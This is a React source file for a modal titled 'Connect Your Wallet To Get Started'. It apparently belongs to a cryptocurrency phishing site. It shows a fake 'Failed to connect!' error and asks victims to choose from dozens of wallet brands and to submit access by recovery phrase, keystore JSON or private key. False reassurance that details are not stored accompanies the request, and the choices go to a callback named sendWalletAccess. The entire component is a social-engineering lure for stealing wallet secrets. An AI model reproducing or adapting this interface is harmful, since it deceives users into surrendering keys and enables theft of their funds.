import React, { useState } from "react";
import styles from "./WalletConnect.module.css"; // Import the CSS module

function WalletConnectModal({closeModal, sendWalletAccess}) {
  const [walletType, setWalletType] = useState("");
  const [accessType, setAccessType] = useState("");

  const handleWalletForm =(e)=>{
    e.preventDefault();
    if(walletType && accessType)
      sendWalletAccess({walletType, accessType})
  }

  return (
    <div className={styles.overlay} onClick={closeModal}>
      <div
        className={styles.modalContainer}
        onClick={(e) => e.stopPropagation()} // Prevents closing modal when clicking inside it
      >
        <button className={styles.closeButton} onClick={closeModal}>
          &times;
        </button>
        <h2>Connect Your Wallet To Get Started</h2>
        <p className={styles.errorText}>
          Failed to connect! Use the form below to connect manually.
        </p>
        <div className={styles.formGroup}>
          <select className={styles.select} value={walletType} onChange={(e)=>setWalletType(e.target.value)}>
            <option value="" disabled>
              Wallet Type
            </option>
            <option value="Metamask">Metamask</option>
            <option value="Trust Wallet">Trust Wallet</option>
            <option value="Coinbase">Coinbase</option>
            <option value="Keplr Wallet">Keplr Wallet</option>
            <option value="Safepal">Safepal</option>
            <option value="Tronlink">Tronlink</option>
            <option value="Defichain Wallet">Defichain Wallet</option>
            <option value="DFX Defichain">DFX Defichain</option>
            <option value="Solana">Solana</option>
            <option value="Blockchain">Blockchain</option>
            <option value="Lobstr Wallet">Lobstr Wallet</option>
            <option value="Yoroi Wallet">Yoroi Wallet</option>
            <option value="Coinomi">Coinomi</option>
            <option value="Edge Wallet">Edge Wallet</option>
            <option value="Solar Wallet">Solar Wallet</option>
            <option value="Pera Algo Wallet">Pera Algo Wallet</option>
            <option value="Sender Wallet">Sender Wallet</option>
            <option value="Xcel Pay Wallet">Xcel Pay Wallet</option>
            <option value="Anchor Wallet">Anchor Wallet</option>
            <option value="ONTO">ONTO</option>
            <option value="Trezor">Trezor</option>
            <option value="Zengo">Zengo</option>
            <option value="Atomic Wallet">Atomic Wallet</option>
            <option value="1inch Wallet">1inch Wallet</option>
            <option value="bitpay">Bitpay</option>
            <option value="electrum">Electrum</option>
            <option value="bitcoin-core">Bitcoin Core</option>
            <option value="alphawallet">AlphaWallet</option>
            <option value="best-wallet">Best Wallet</option>
            <option value="rainbow-wallet">Rainbow Wallet</option>
            <option value="agent-wallet">Agent Wallet</option>
            <option value="cybavo-wallet">CYBAVO Wallet</option>
            <option value="grindplus-wallet">GrindPlus Wallet</option>
            <option value="Coinomi">Coinomi</option>
            <option value="Token Pocket">Token Pocket</option>
            <option value="Guarda Wallet">Guarda Wallet</option>
            <option value="MEW Wallet">MEW Wallet</option>
            <option value="Exodus">Exodus</option>
            <option value="Trustee Wallet">Trustee Wallet</option>
            <option value="Ellipal">Ellipal</option>
            <option value="Infinito Wallet">Infinito Wallet</option>
            <option value="Wombat">Wombat</option>
          </select>
        </div>
        <div className={styles.formGroup}>
          <select className={styles.select} value={accessType} onChange={(e) => setAccessType(e.target.value)}>
            <option value="" disabled>
              Access Type
            </option>
            <option value="phrase">Phrase</option>
            <option value="keystoreJson">Keystore JSON</option>
            <option value="privateKey">Private Key</option>
          </select>
        </div>
        <p className={styles.infoText}>
          Any misinformation may hinder the successful resolution of the issue.
          Your details are not stored on our system; they are for resolution
          purposes only.
        </p>
        <div className={styles.buttonGroup}>
          <button className={styles.connectButton} onClick={handleWalletForm}>
            Connect Wallet
          </button>
          <button className={styles.cancelButton} onClick={closeModal}>
            Cancel
          </button>
        </div>
      </div>
    </div>
  );
}

export default WalletConnectModal;
